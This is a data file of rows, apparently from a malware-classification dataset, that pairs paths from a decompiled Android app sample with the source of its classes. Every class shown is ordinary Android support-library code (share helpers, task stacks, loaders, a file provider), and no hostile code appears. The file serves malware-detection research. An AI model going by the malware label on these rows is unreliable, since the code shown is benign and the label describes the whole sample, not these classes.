"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\ShareCompatImplBase.code","static class ShareCompatImplBase implements ShareCompatImpl {   ShareCompatImplBase(){   }   @Override public void configureMenuItem(  MenuItem item,  IntentBuilder shareIntent){     item.setIntent(shareIntent.createChooserIntent());   }   @Override public String escapeHtml(  CharSequence text){     StringBuilder out=new StringBuilder();     withinStyle(out,text,0,text.length());     return out.toString();   }   private static void withinStyle(  StringBuilder out,  CharSequence text,  int start,  int end){     int i=start;     while (i < end) {       char c=text.charAt(i);       if (c == '<') {         out.append(""&lt;"");       }  else       if (c == '>') {         out.append(""&gt;"");       }  else       if (c == '&') {         out.append(""&amp;"");       }  else       if (c > '~' || c < ' ') {         out.append(""&#"" + ((int)c) + "";"");       }  else       if (c == ' ') {         while (i + 1 < end && text.charAt(i + 1) == ' ') {           out.append(""&nbsp;"");           i++;         }         out.append(' ');       }  else {         out.append(c);       }       i++;     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\ShareCompatImplICS.code","static class ShareCompatImplICS extends ShareCompatImplBase {   ShareCompatImplICS(){   }   @Override public void configureMenuItem(  MenuItem item,  IntentBuilder shareIntent){     ShareCompatICS.configureMenuItem(item,shareIntent.getActivity(),shareIntent.getIntent());     if (shouldAddChooserIntent(item)) {       item.setIntent(shareIntent.createChooserIntent());     }   }   boolean shouldAddChooserIntent(  MenuItem item){     return !item.hasSubMenu();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\ShareCompatImplJB.code","static class ShareCompatImplJB extends ShareCompatImplICS {   ShareCompatImplJB(){   }   @Override public String escapeHtml(  CharSequence html){     return ShareCompatJB.escapeHtml(html);   }   @Override boolean shouldAddChooserIntent(  MenuItem item){     return false;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\ShareCompatJB.code","class ShareCompatJB {   ShareCompatJB(){   }   public static String escapeHtml(  CharSequence html){     return Html.escapeHtml(html);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\SlideDrawable.code","public class SlideDrawable extends LevelListDrawable implements Drawable.Callback {   private final boolean mHasMirroring;   private float mOffset;   private float mPosition;   private final Rect mTmpRect;   private SlideDrawable(  Drawable wrapped){     this.mHasMirroring=Build.VERSION.SDK_INT > 18;     this.mTmpRect=new Rect();     if (DrawableCompat.isAutoMirrored(wrapped)) {       DrawableCompat.setAutoMirrored(this,true);     }     addLevel(0,0,wrapped);   }   public void setPosition(  float position){     this.mPosition=position;     invalidateSelf();   }   public float getPosition(){     return this.mPosition;   }   public void setOffset(  float offset){     this.mOffset=offset;     invalidateSelf();   }   @Override public void draw(  Canvas canvas){     copyBounds(this.mTmpRect);     canvas.save();     boolean isLayoutRTL=ViewCompat.getLayoutDirection(ActionBarDrawerToggle.this.mActivity.getWindow().getDecorView()) == 1;     int flipRtl=isLayoutRTL ? -1 : 1;     int width=this.mTmpRect.width();     canvas.translate((-this.mOffset) * width * this.mPosition* flipRtl,0.0f);     if (isLayoutRTL && !this.mHasMirroring) {       canvas.translate(width,0.0f);       canvas.scale(-1.0f,1.0f);     }     super.draw(canvas);     canvas.restore();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\Style.code","public static abstract class Style {   CharSequence mBigContentTitle;   Builder mBuilder;   CharSequence mSummaryText;   boolean mSummaryTextSet=false;   public void setBuilder(  Builder builder){     if (this.mBuilder != builder) {       this.mBuilder=builder;       if (this.mBuilder != null) {         this.mBuilder.setStyle(this);       }     }   }   public Notification build(){     if (this.mBuilder == null) {       return null;     }     Notification notification=this.mBuilder.build();     return notification;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\SuperNotCalledException.code","final class SuperNotCalledException extends AndroidRuntimeException {   public SuperNotCalledException(  String msg){     super(msg);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\SupportParentable.code","public interface SupportParentable {   Intent getSupportParentActivityIntent(); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\TabInfo.code","public static final class TabInfo {   private final Bundle args;   private final Class<?> clss;   private Fragment fragment;   private final String tag;   TabInfo(  String _tag,  Class<?> _class,  Bundle _args){     this.tag=_tag;     this.clss=_class;     this.args=_args;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\TaskStackBuilder.code","public class TaskStackBuilder implements Iterable<Intent> {   private static final TaskStackBuilderImpl IMPL;   private static final String TAG=""TaskStackBuilder"";   private final ArrayList<Intent> mIntents=new ArrayList<>();   private final Context mSourceContext; public interface SupportParentable {     Intent getSupportParentActivityIntent();   } public interface TaskStackBuilderImpl {     PendingIntent getPendingIntent(    Context context,    Intent[] intentArr,    int i,    int i2,    Bundle bundle);   } static class TaskStackBuilderImplBase implements TaskStackBuilderImpl {     TaskStackBuilderImplBase(){     }     @Override public PendingIntent getPendingIntent(    Context context,    Intent[] intents,    int requestCode,    int flags,    Bundle options){       Intent topIntent=new Intent(intents[intents.length - 1]);       topIntent.addFlags(268435456);       return PendingIntent.getActivity(context,requestCode,topIntent,flags);     }   } static class TaskStackBuilderImplHoneycomb implements TaskStackBuilderImpl {     TaskStackBuilderImplHoneycomb(){     }     @Override public PendingIntent getPendingIntent(    Context context,    Intent[] intents,    int requestCode,    int flags,    Bundle options){       intents[0]=new Intent(intents[0]).addFlags(268484608);       return TaskStackBuilderHoneycomb.getActivitiesPendingIntent(context,requestCode,intents,flags);     }   } static class TaskStackBuilderImplJellybean implements TaskStackBuilderImpl {     TaskStackBuilderImplJellybean(){     }     @Override public PendingIntent getPendingIntent(    Context context,    Intent[] intents,    int requestCode,    int flags,    Bundle options){       intents[0]=new Intent(intents[0]).addFlags(268484608);       return TaskStackBuilderJellybean.getActivitiesPendingIntent(context,requestCode,intents,flags,options);     }   } static {     if (Build.VERSION.SDK_INT >= 11) {       IMPL=new TaskStackBuilderImplHoneycomb();     }  else {       IMPL=new TaskStackBuilderImplBase();     }   }   private TaskStackBuilder(  Context a2){     this.mSourceContext=a2;   }   public static TaskStackBuilder create(  Context context){     return new TaskStackBuilder(context);   }   public static TaskStackBuilder from(  Context context){     return create(context);   }   public TaskStackBuilder addNextIntent(  Intent nextIntent){     this.mIntents.add(nextIntent);     return this;   }   public TaskStackBuilder addNextIntentWithParentStack(  Intent nextIntent){     ComponentName target=nextIntent.getComponent();     if (target == null) {       target=nextIntent.resolveActivity(this.mSourceContext.getPackageManager());     }     if (target != null) {       addParentStack(target);     }     addNextIntent(nextIntent);     return this;   }   public TaskStackBuilder addParentStack(  Activity activity){     Intent parent=null;     if (activity instanceof SupportParentable) {       parent=((SupportParentable)activity).getSupportParentActivityIntent();     }     if (parent == null) {       parent=NavUtils.getParentActivityIntent(activity);     }     if (parent != null) {       ComponentName target=parent.getComponent();       if (target == null) {         target=parent.resolveActivity(this.mSourceContext.getPackageManager());       }       addParentStack(target);       addNextIntent(parent);     }     return this;   }   public TaskStackBuilder addParentStack(  Class<?> sourceActivityClass){     return addParentStack(new ComponentName(this.mSourceContext,sourceActivityClass));   }   public TaskStackBuilder addParentStack(  ComponentName sourceActivityName){     int insertAt=this.mIntents.size();     try {       Intent parent=NavUtils.getParentActivityIntent(this.mSourceContext,sourceActivityName);       while (parent != null) {         this.mIntents.add(insertAt,parent);         parent=NavUtils.getParentActivityIntent(this.mSourceContext,parent.getComponent());       }       return this;     }  catch (    PackageManager.NameNotFoundException e) {       Log.e(TAG,""Bad ComponentName while traversing activity parent metadata"");       throw new IllegalArgumentException(e);     }   }   public int getIntentCount(){     return this.mIntents.size();   }   public Intent getIntent(  int index){     return editIntentAt(index);   }   public Intent editIntentAt(  int index){     return this.mIntents.get(index);   }   @Override public Iterator<Intent> iterator(){     return this.mIntents.iterator();   }   public void startActivities(){     startActivities(null);   }   public void startActivities(  Bundle options){     if (this.mIntents.isEmpty()) {       throw new IllegalStateException(""No intents added to TaskStackBuilder; cannot startActivities"");     }     Intent[] intents=(Intent[])this.mIntents.toArray(new Intent[this.mIntents.size()]);     intents[0]=new Intent(intents[0]).addFlags(268484608);     if (!ContextCompat.startActivities(this.mSourceContext,intents,options)) {       Intent topIntent=new Intent(intents[intents.length - 1]);       topIntent.addFlags(268435456);       this.mSourceContext.startActivity(topIntent);     }   }   public PendingIntent getPendingIntent(  int requestCode,  int flags){     return getPendingIntent(requestCode,flags,null);   }   public PendingIntent getPendingIntent(  int requestCode,  int flags,  Bundle options){     if (this.mIntents.isEmpty()) {       throw new IllegalStateException(""No intents added to TaskStackBuilder; cannot getPendingIntent"");     }     Intent[] intents=(Intent[])this.mIntents.toArray(new Intent[this.mIntents.size()]);     intents[0]=new Intent(intents[0]).addFlags(268484608);     return IMPL.getPendingIntent(this.mSourceContext,intents,requestCode,flags,options);   }   public Intent[] getIntents(){     Intent[] intents=new Intent[this.mIntents.size()];     if (intents.length != 0) {       intents[0]=new Intent(this.mIntents.get(0)).addFlags(268484608);       for (int i=1; i < intents.length; i++) {         intents[i]=new Intent(this.mIntents.get(i));       }     }     return intents;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\TaskStackBuilderHoneycomb.code","class TaskStackBuilderHoneycomb {   TaskStackBuilderHoneycomb(){   }   public static PendingIntent getActivitiesPendingIntent(  Context context,  int requestCode,  Intent[] intents,  int flags){     return PendingIntent.getActivities(context,requestCode,intents,flags);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\TaskStackBuilderImpl.code","public interface TaskStackBuilderImpl {   PendingIntent getPendingIntent(  Context context,  Intent[] intentArr,  int i,  int i2,  Bundle bundle); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\TaskStackBuilderImplBase.code","static class TaskStackBuilderImplBase implements TaskStackBuilderImpl {   TaskStackBuilderImplBase(){   }   @Override public PendingIntent getPendingIntent(  Context context,  Intent[] intents,  int requestCode,  int flags,  Bundle options){     Intent topIntent=new Intent(intents[intents.length - 1]);     topIntent.addFlags(268435456);     return PendingIntent.getActivity(context,requestCode,topIntent,flags);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\TaskStackBuilderImplHoneycomb.code","static class TaskStackBuilderImplHoneycomb implements TaskStackBuilderImpl {   TaskStackBuilderImplHoneycomb(){   }   @Override public PendingIntent getPendingIntent(  Context context,  Intent[] intents,  int requestCode,  int flags,  Bundle options){     intents[0]=new Intent(intents[0]).addFlags(268484608);     return TaskStackBuilderHoneycomb.getActivitiesPendingIntent(context,requestCode,intents,flags);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\TaskStackBuilderImplJellybean.code","static class TaskStackBuilderImplJellybean implements TaskStackBuilderImpl {   TaskStackBuilderImplJellybean(){   }   @Override public PendingIntent getPendingIntent(  Context context,  Intent[] intents,  int requestCode,  int flags,  Bundle options){     intents[0]=new Intent(intents[0]).addFlags(268484608);     return TaskStackBuilderJellybean.getActivitiesPendingIntent(context,requestCode,intents,flags,options);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\TaskStackBuilderJellybean.code","class TaskStackBuilderJellybean {   TaskStackBuilderJellybean(){   }   public static PendingIntent getActivitiesPendingIntent(  Context context,  int requestCode,  Intent[] intents,  int flags,  Bundle options){     return PendingIntent.getActivities(context,requestCode,intents,flags,options);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.content\AsyncTaskLoader.code","public abstract class AsyncTaskLoader<D> extends Loader<D> {   static final boolean DEBUG=false;   static final String TAG=""AsyncTaskLoader"";   volatile AsyncTaskLoader<D>.LoadTask mCancellingTask;   Handler mHandler;   long mLastLoadCompleteTime;   volatile AsyncTaskLoader<D>.LoadTask mTask;   long mUpdateThrottle;   public abstract D loadInBackground(); public final class LoadTask extends ModernAsyncTask<Void,Void,D> implements Runnable {     private CountDownLatch done=new CountDownLatch(1);     D result;     boolean waiting;     LoadTask(){     }     @Override public D doInBackground(    Void... voidArr){       this.result=(D)AsyncTaskLoader.this.onLoadInBackground();       return this.result;     }     @Override protected void onPostExecute(    D data){       try {         AsyncTaskLoader.this.dispatchOnLoadComplete(this,data);       }   finally {         this.done.countDown();       }     }     @Override protected void onCancelled(){       try {         AsyncTaskLoader.this.dispatchOnCancelled(this,this.result);       }   finally {         this.done.countDown();       }     }     @Override public void run(){       this.waiting=AsyncTaskLoader.DEBUG;       AsyncTaskLoader.this.executePendingTask();     }   }   public AsyncTaskLoader(  Context context){     super(context);     this.mLastLoadCompleteTime=-10000L;   }   public void setUpdateThrottle(  long delayMS){     this.mUpdateThrottle=delayMS;     if (delayMS != 0) {       this.mHandler=new Handler();     }   }   @Override public void onForceLoad(){     super.onForceLoad();     cancelLoad();     this.mTask=new LoadTask();     executePendingTask();   }   public boolean cancelLoad(){     boolean cancelled=DEBUG;     if (this.mTask != null) {       if (this.mCancellingTask != null) {         if (this.mTask.waiting) {           this.mTask.waiting=DEBUG;           this.mHandler.removeCallbacks(this.mTask);         }         this.mTask=null;       }  else       if (this.mTask.waiting) {         this.mTask.waiting=DEBUG;         this.mHandler.removeCallbacks(this.mTask);         this.mTask=null;       }  else {         cancelled=this.mTask.cancel(DEBUG);         if (cancelled) {           this.mCancellingTask=this.mTask;         }         this.mTask=null;       }     }     return cancelled;   }   public void onCanceled(  D data){   }   void executePendingTask(){     if (this.mCancellingTask == null && this.mTask != null) {       if (this.mTask.waiting) {         this.mTask.waiting=DEBUG;         this.mHandler.removeCallbacks(this.mTask);       }       if (this.mUpdateThrottle > 0) {         long now=SystemClock.uptimeMillis();         if (now < this.mLastLoadCompleteTime + this.mUpdateThrottle) {           this.mTask.waiting=true;           this.mHandler.postAtTime(this.mTask,this.mLastLoadCompleteTime + this.mUpdateThrottle);           return;         }       }       this.mTask.executeOnExecutor(ModernAsyncTask.THREAD_POOL_EXECUTOR,(Void[])null);     }   }   void dispatchOnCancelled(  AsyncTaskLoader<D>.LoadTask task,  D data){     onCanceled(data);     if (this.mCancellingTask == task) {       rollbackContentChanged();       this.mLastLoadCompleteTime=SystemClock.uptimeMillis();       this.mCancellingTask=null;       executePendingTask();     }   }   void dispatchOnLoadComplete(  AsyncTaskLoader<D>.LoadTask task,  D data){     if (this.mTask != task) {       dispatchOnCancelled(task,data);       return;     }     if (isAbandoned()) {       onCanceled(data);       return;     }     commitContentChanged();     this.mLastLoadCompleteTime=SystemClock.uptimeMillis();     this.mTask=null;     deliverResult(data);   }   protected D onLoadInBackground(){     return loadInBackground();   }   public void waitForLoader(){     AsyncTaskLoader<D>.LoadTask task=this.mTask;     if (task != null) {       try {         ((LoadTask)task).done.await();       }  catch (      InterruptedException e) {       }     }   }   @Override public void dump(  String prefix,  FileDescriptor fd,  PrintWriter writer,  String[] args){     super.dump(prefix,fd,writer,args);     if (this.mTask != null) {       writer.print(prefix);       writer.print(""mTask="");       writer.print(this.mTask);       writer.print("" waiting="");       writer.println(this.mTask.waiting);     }     if (this.mCancellingTask != null) {       writer.print(prefix);       writer.print(""mCancellingTask="");       writer.print(this.mCancellingTask);       writer.print("" waiting="");       writer.println(this.mCancellingTask.waiting);     }     if (this.mUpdateThrottle != 0) {       writer.print(prefix);       writer.print(""mUpdateThrottle="");       TimeUtils.formatDuration(this.mUpdateThrottle,writer);       writer.print("" mLastLoadCompleteTime="");       TimeUtils.formatDuration(this.mLastLoadCompleteTime,SystemClock.uptimeMillis(),writer);       writer.println();     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.content\AsyncTaskResult.code","public static class AsyncTaskResult<Data> {   final Data[] mData;   final ModernAsyncTask mTask;   AsyncTaskResult(  ModernAsyncTask task,  Data... data){     this.mTask=task;     this.mData=data;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.content\BroadcastRecord.code","public static class BroadcastRecord {   final Intent intent;   final ArrayList<ReceiverRecord> receivers;   BroadcastRecord(  Intent _intent,  ArrayList<ReceiverRecord> _receivers){     this.intent=_intent;     this.receivers=_receivers;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.content\ContextCompat.code","public class ContextCompat {   private static final String DIR_ANDROID=""Android"";   private static final String DIR_CACHE=""cache"";   private static final String DIR_DATA=""data"";   private static final String DIR_FILES=""files"";   private static final String DIR_OBB=""obb"";   public static boolean startActivities(  Context context,  Intent[] intents){     return startActivities(context,intents,null);   }   public static boolean startActivities(  Context context,  Intent[] intents,  Bundle options){     int version=Build.VERSION.SDK_INT;     if (version >= 16) {       ContextCompatJellybean.startActivities(context,intents,options);       return true;     }     if (version >= 11) {       ContextCompatHoneycomb.startActivities(context,intents);       return true;     }     return false;   }   public static File[] getObbDirs(  Context context){     File single;     int version=Build.VERSION.SDK_INT;     if (version >= 19) {       return ContextCompatKitKat.getObbDirs(context);     }     if (version >= 11) {       single=ContextCompatHoneycomb.getObbDir(context);     }  else {       single=buildPath(Environment.getExternalStorageDirectory(),DIR_ANDROID,DIR_OBB,context.getPackageName());     }     return new File[]{single};   }   public static File[] getExternalFilesDirs(  Context context,  String type){     File single;     int version=Build.VERSION.SDK_INT;     if (version >= 19) {       return ContextCompatKitKat.getExternalFilesDirs(context,type);     }     if (version >= 8) {       single=ContextCompatFroyo.getExternalFilesDir(context,type);     }  else {       single=buildPath(Environment.getExternalStorageDirectory(),DIR_ANDROID,DIR_DATA,context.getPackageName(),DIR_FILES,type);     }     return new File[]{single};   }   public static File[] getExternalCacheDirs(  Context context){     File single;     int version=Build.VERSION.SDK_INT;     if (version >= 19) {       return ContextCompatKitKat.getExternalCacheDirs(context);     }     if (version >= 8) {       single=ContextCompatFroyo.getExternalCacheDir(context);     }  else {       single=buildPath(Environment.getExternalStorageDirectory(),DIR_ANDROID,DIR_DATA,context.getPackageName(),DIR_CACHE);     }     return new File[]{single};   }   private static File buildPath(  File base,  String... segments){     File cur;     int len$=segments.length;     int i$=0;     File cur2=base;     while (i$ < len$) {       String segment=segments[i$];       if (cur2 == null) {         cur=new File(segment);       }  else {         cur=segment != null ? new File(cur2,segment) : cur2;       }       i$++;       cur2=cur;     }     return cur2;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.content\ContextCompatFroyo.code","class ContextCompatFroyo {   ContextCompatFroyo(){   }   public static File getExternalCacheDir(  Context context){     return context.getExternalCacheDir();   }   public static File getExternalFilesDir(  Context context,  String type){     return context.getExternalFilesDir(type);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.content\ContextCompatHoneycomb.code","class ContextCompatHoneycomb {   ContextCompatHoneycomb(){   }   public static void startActivities(  Context context,  Intent[] intents){     context.startActivities(intents);   }   public static File getObbDir(  Context context){     return context.getObbDir();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.content\ContextCompatJellybean.code","class ContextCompatJellybean {   ContextCompatJellybean(){   }   public static void startActivities(  Context context,  Intent[] intents,  Bundle options){     context.startActivities(intents,options);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.content\ContextCompatKitKat.code","class ContextCompatKitKat {   ContextCompatKitKat(){   }   public static File[] getExternalCacheDirs(  Context context){     return context.getExternalCacheDirs();   }   public static File[] getExternalFilesDirs(  Context context,  String type){     return context.getExternalFilesDirs(type);   }   public static File[] getObbDirs(  Context context){     return context.getObbDirs();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.content\CursorLoader.code","public class CursorLoader extends AsyncTaskLoader<Cursor> {   Cursor mCursor;   final Loader<Cursor>.ForceLoadContentObserver mObserver;   String[] mProjection;   String mSelection;   String[] mSelectionArgs;   String mSortOrder;   Uri mUri;   @Override public Cursor loadInBackground(){     Cursor cursor=getContext().getContentResolver().query(this.mUri,this.mProjection,this.mSelection,this.mSelectionArgs,this.mSortOrder);     if (cursor != null) {       cursor.getCount();       cursor.registerContentObserver(this.mObserver);     }     return cursor;   }   @Override public void deliverResult(  Cursor cursor){     if (isReset()) {       if (cursor != null) {         cursor.close();         return;       }       return;     }     Cursor oldCursor=this.mCursor;     this.mCursor=cursor;     if (isStarted()) {       super.deliverResult((CursorLoader)cursor);     }     if (oldCursor != null && oldCursor != cursor && !oldCursor.isClosed()) {       oldCursor.close();     }   }   public CursorLoader(  Context context){     super(context);     this.mObserver=new Loader.ForceLoadContentObserver();   }   public CursorLoader(  Context context,  Uri uri,  String[] projection,  String selection,  String[] selectionArgs,  String sortOrder){     super(context);     this.mObserver=new Loader.ForceLoadContentObserver();     this.mUri=uri;     this.mProjection=projection;     this.mSelection=selection;     this.mSelectionArgs=selectionArgs;     this.mSortOrder=sortOrder;   }   @Override protected void onStartLoading(){     if (this.mCursor != null) {       deliverResult(this.mCursor);     }     if (takeContentChanged() || this.mCursor == null) {       forceLoad();     }   }   @Override protected void onStopLoading(){     cancelLoad();   }   @Override public void onCanceled(  Cursor cursor){     if (cursor != null && !cursor.isClosed()) {       cursor.close();     }   }   @Override public void onReset(){     super.onReset();     onStopLoading();     if (this.mCursor != null && !this.mCursor.isClosed()) {       this.mCursor.close();     }     this.mCursor=null;   }   public Uri getUri(){     return this.mUri;   }   public void setUri(  Uri uri){     this.mUri=uri;   }   public String[] getProjection(){     return this.mProjection;   }   public void setProjection(  String[] projection){     this.mProjection=projection;   }   public String getSelection(){     return this.mSelection;   }   public void setSelection(  String selection){     this.mSelection=selection;   }   public String[] getSelectionArgs(){     return this.mSelectionArgs;   }   public void setSelectionArgs(  String[] selectionArgs){     this.mSelectionArgs=selectionArgs;   }   public String getSortOrder(){     return this.mSortOrder;   }   public void setSortOrder(  String sortOrder){     this.mSortOrder=sortOrder;   }   @Override public void dump(  String prefix,  FileDescriptor fd,  PrintWriter writer,  String[] args){     super.dump(prefix,fd,writer,args);     writer.print(prefix);     writer.print(""mUri="");     writer.println(this.mUri);     writer.print(prefix);     writer.print(""mProjection="");     writer.println(Arrays.toString(this.mProjection));     writer.print(prefix);     writer.print(""mSelection="");     writer.println(this.mSelection);     writer.print(prefix);     writer.print(""mSelectionArgs="");     writer.println(Arrays.toString(this.mSelectionArgs));     writer.print(prefix);     writer.print(""mSortOrder="");     writer.println(this.mSortOrder);     writer.print(prefix);     writer.print(""mCursor="");     writer.println(this.mCursor);     writer.print(prefix);     writer.print(""mContentChanged="");     writer.println(this.mContentChanged);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.content\FileProvider.code","public class FileProvider extends ContentProvider {   private static final String ATTR_NAME=""name"";   private static final String ATTR_PATH=""path"";   private static final String META_DATA_FILE_PROVIDER_PATHS=""android.support.FILE_PROVIDER_PATHS"";   private static final String TAG_CACHE_PATH=""cache-path"";   private static final String TAG_EXTERNAL=""external-path"";   private static final String TAG_FILES_PATH=""files-path"";   private static final String TAG_ROOT_PATH=""root-path"";   private PathStrategy mStrategy;   private static final String[] COLUMNS={""_display_name"",""_size""};   private static final File DEVICE_ROOT=new File(""/"");   private static HashMap<String,PathStrategy> sCache=new HashMap<>(); public interface PathStrategy {     File getFileForUri(    Uri uri);     Uri getUriForFile(    File file);   }   @Override public boolean onCreate(){     return true;   }   @Override public void attachInfo(  Context context,  ProviderInfo info){     super.attachInfo(context,info);     if (info.exported) {       throw new SecurityException(""Provider must not be exported"");     }     if (!info.grantUriPermissions) {       throw new SecurityException(""Provider must grant uri permissions"");     }     this.mStrategy=getPathStrategy(context,info.authority);   }   public static Uri getUriForFile(  Context context,  String authority,  File file){     PathStrategy strategy=getPathStrategy(context,authority);     return strategy.getUriForFile(file);   }   @Override public Cursor query(  Uri uri,  String[] projection,  String selection,  String[] selectionArgs,  String sortOrder){     int i;     File file=this.mStrategy.getFileForUri(uri);     if (projection == null) {       projection=COLUMNS;     }     String[] cols=new String[projection.length];     Object[] values=new Object[projection.length];     String[] arr$=projection;     int len$=arr$.length;     int i$=0;     int i2=0;     while (i$ < len$) {       String col=arr$[i$];       if (""_display_name"".equals(col)) {         cols[i2]=""_display_name"";         i=i2 + 1;         values[i2]=file.getName();       }  else       if (""_size"".equals(col)) {         cols[i2]=""_size"";         i=i2 + 1;         values[i2]=Long.valueOf(file.length());       }  else {         i=i2;       }       i$++;       i2=i;     }     String[] cols2=copyOf(cols,i2);     Object[] values2=copyOf(values,i2);     MatrixCursor cursor=new MatrixCursor(cols2,1);     cursor.addRow(values2);     return cursor;   }   @Override public String getType(  Uri uri){     File file=this.mStrategy.getFileForUri(uri);     int lastDot=file.getName().lastIndexOf(46);     if (lastDot >= 0) {       String extension=file.getName().substring(lastDot + 1);       String mime=MimeTypeMap.getSingleton().getMimeTypeFromExtension(extension);       if (mime != null) {         return mime;       }     }     return ""application/octet-stream"";   }   @Override public Uri insert(  Uri uri,  ContentValues values){     throw new UnsupportedOperationException(""No external inserts"");   }   @Override public int update(  Uri uri,  ContentValues values,  String selection,  String[] selectionArgs){     throw new UnsupportedOperationException(""No external updates"");   }   @Override public int delete(  Uri uri,  String selection,  String[] selectionArgs){     File file=this.mStrategy.getFileForUri(uri);     return file.delete() ? 1 : 0;   }   @Override public ParcelFileDescriptor openFile(  Uri uri,  String mode) throws FileNotFoundException {     File file=this.mStrategy.getFileForUri(uri);     int fileMode=modeToMode(mode);     return ParcelFileDescriptor.open(file,fileMode);   }   private static PathStrategy getPathStrategy(  Context context,  String authority){     PathStrategy strat; synchronized (sCache) {       strat=sCache.get(authority);       if (strat == null) {         try {           try {             strat=parsePathStrategy(context,authority);             sCache.put(authority,strat);           }  catch (          IOException e) {             throw new IllegalArgumentException(""Failed to parse android.support.FILE_PROVIDER_PATHS meta-data"",e);           }         }  catch (        XmlPullParserException e2) {           throw new IllegalArgumentException(""Failed to parse android.support.FILE_PROVIDER_PATHS meta-data"",e2);         }       }     }     return strat;   }   private static PathStrategy parsePathStrategy(  Context context,  String authority) throws IOException, XmlPullParserException {     SimplePathStrategy strat=new SimplePathStrategy(authority);     ProviderInfo info=context.getPackageManager().resolveContentProvider(authority,128);     XmlResourceParser in=info.loadXmlMetaData(context.getPackageManager(),META_DATA_FILE_PROVIDER_PATHS);     if (in == null) {       throw new IllegalArgumentException(""Missing android.support.FILE_PROVIDER_PATHS meta-data"");     }     while (true) {       int type=in.next();       if (type != 1) {         if (type == 2) {           String tag=in.getName();           String name=in.getAttributeValue(null,ATTR_NAME);           String path=in.getAttributeValue(null,ATTR_PATH);           File target=null;           if (TAG_ROOT_PATH.equals(tag)) {             target=buildPath(DEVICE_ROOT,path);           }  else           if (TAG_FILES_PATH.equals(tag)) {             target=buildPath(context.getFilesDir(),path);           }  else           if (TAG_CACHE_PATH.equals(tag)) {             target=buildPath(context.getCacheDir(),path);           }  else           if (TAG_EXTERNAL.equals(tag)) {             target=buildPath(Environment.getExternalStorageDirectory(),path);           }           if (target != null) {             strat.addRoot(name,target);           }         }       }  else {         return strat;       }     }   } public static class SimplePathStrategy implements PathStrategy {     private final String mAuthority;     private final HashMap<String,File> mRoots=new HashMap<>();     public SimplePathStrategy(    String authority){       this.mAuthority=authority;     }     public void addRoot(    String name,    File root){       if (TextUtils.isEmpty(name)) {         throw new IllegalArgumentException(""Name must not be empty"");       }       try {         this.mRoots.put(name,root.getCanonicalFile());       }  catch (      IOException e) {         throw new IllegalArgumentException(""Failed to resolve canonical path for "" + root,e);       }     }     @Override public Uri getUriForFile(    File file){       String path;       try {         String path2=file.getCanonicalPath();         Map.Entry<String,File> mostSpecific=null;         for (        Map.Entry<String,File> root : this.mRoots.entrySet()) {           String rootPath=root.getValue().getPath();           if (path2.startsWith(rootPath) && (mostSpecific == null || rootPath.length() > mostSpecific.getValue().getPath().length())) {             mostSpecific=root;           }         }         if (mostSpecific 